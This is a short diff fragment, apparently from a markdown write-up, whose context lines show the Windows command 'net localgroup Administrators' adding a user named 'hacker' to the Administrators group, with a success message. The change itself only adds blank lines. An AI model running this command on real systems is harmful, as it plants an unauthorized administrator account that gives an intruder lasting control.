@@ -23,3 +23,5 @@ net localgroup Administrators $_USERNAME /add
 C:\Windows\system32> net localgroup Administrators hacker /add
 The command completed successfully.
 ```
+
+
